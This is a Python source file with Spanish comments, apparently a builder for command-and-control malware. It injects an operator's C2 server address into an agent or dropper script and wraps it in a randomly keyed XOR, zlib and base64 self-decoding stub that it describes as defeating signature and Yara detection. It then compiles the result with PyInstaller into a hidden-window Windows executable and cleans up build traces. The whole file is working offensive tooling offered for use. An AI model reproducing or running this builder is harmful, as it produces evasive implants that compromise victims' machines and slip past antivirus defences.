import os
import subprocess
import shutil
import sys
import random
import zlib
import base64


def xor_obfuscate(source_code: str) -> str:
    """
    Genera un wrapper XOR polimórfico con clave aleatoria en cada compilación.
    El EXE resultante NUNCA tendrá la misma firma de bytes → 0 Yara Rules posibles.
    """
    key = random.randint(1, 253)
    compressed = zlib.compress(source_code.encode('utf-8'), level=9)
    xor_bytes = bytes([b ^ key for b in compressed])
    b64_payload = base64.b64encode(xor_bytes).decode('utf-8')

    # Stub mínimo que se autodesobfusca en tiempo de ejecución
    stub = (
        f'import base64,zlib,sys\n'
        f'_K={key}\n'
        f'_P=base64.b64decode("{b64_payload}")\n'
        f'_C=bytes([(b^_K)&0xFF for b in _P])\n'
        f'exec(compile(zlib.decompress(_C),__file__,"exec"))\n'
    )
    return stub


def build_payload(ip: str, port: str, mode: str = 'agent'):
    print("==========================================")
    if mode == 'dropper':
        print("      C2 DROPPER BUILDER (STAGE 1)        ")
        src_file = "dropper.py"
    else:
        print("      C2 NATIVE BUILDER (FUD PE32+)        ")
        src_file = "agent_v2.py"
    print("==========================================")

    # Buscar el fuente en posibles ubicaciones
    agent_src = os.path.join("..", src_file)
    if not os.path.exists(agent_src):
        agent_src = src_file
        if not os.path.exists(agent_src):
            print(f"[-] Error: No se encontró {src_file}")
            sys.exit(1)

    # Leer el agente original
    with open(agent_src, 'r', encoding='utf-8') as f:
        code = f.read()

    # Inyectar las variables del servidor actual
    new_url = f"https://{ip}:{port}"
    code = code.replace('C2_URL = "https://127.0.0.1:5000"', f'C2_URL = "{new_url}"')

    # === POLIMORFISMO XOR POR BUILD ===
    build_id = random.randint(100000, 999999)
    print(f"[*] Generando variante polimórfica #{build_id} (clave XOR única)...")
    polymorphic_code = xor_obfuscate(code)

    # Nombre del EXE según modo
    exe_name = "C2_Dropper_Stage1" if mode == 'dropper' else "C2_Implant_FUD"

    # Escribir archivo temporal de compilación
    temp_target = "payload_compiler_temp.py"
    with open(temp_target, 'w', encoding='utf-8') as f:
        f.write(polymorphic_code)

    print(f"[*] Compilando el implante blindado hacia {new_url}...")

    # Flags de compilación anti-forense
    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",      # Sin consola - Ghost mode
        "--clean",
        "--name", exe_name,
        temp_target
    ]

    try:
        subprocess.run(pyinstaller_cmd, check=True)
        print("[+] PyInstaller finalizó correctamente.")

        exe_path = f"dist/{exe_name}.exe"
        if os.path.exists(exe_path):
            transfers_dir = os.path.join("..", "transfers")
            os.makedirs(transfers_dir, exist_ok=True)
            out_name = "C2_Dropper.exe" if mode == 'dropper' else "C2_Automated_Payload.exe"
            dest = os.path.join(transfers_dir, out_name)
            shutil.copy(exe_path, dest)
            print(f"[+] ¡ÉXITO! Build #{build_id}: {dest}")
        else:
            print("[-] Compilación falló.")

    except subprocess.CalledProcessError as e:
        print(f"[-] Fallo en PyInstaller: {e}")
    finally:
        for cleanup in [temp_target, f"{exe_name}.spec"]:
            if os.path.exists(cleanup):
                os.remove(cleanup)
        for cleanup_dir in ["build", "dist", "__pycache__"]:
            if os.path.exists(cleanup_dir):
                shutil.rmtree(cleanup_dir, ignore_errors=True)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Uso: python c2_builder.py <IP_SERVIDOR> <PUERTO> [agent|dropper]")
        print("Ej:  python c2_builder.py 192.168.1.50 5000")
        print("Ej:  python c2_builder.py 192.168.1.50 5000 dropper")
        sys.exit(1)

    mode = sys.argv[3] if len(sys.argv) > 3 else 'agent'
    build_payload(sys.argv[1], sys.argv[2], mode)
